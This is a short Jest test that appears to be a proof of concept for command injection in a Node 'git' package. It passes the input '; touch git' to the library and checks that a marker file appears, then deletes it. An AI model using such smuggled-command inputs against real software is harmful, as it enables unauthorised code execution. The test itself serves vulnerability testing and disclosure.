test("Remote code execution in git", (done) => {
  expect.assertions(2);
  const Git = require("git").Git;
  const fs = require("fs");
  const path = "./git";
  let repo = new Git("repo-test");
  let user_input = "; touch git";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    repo.git(user_input, function (err, result) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
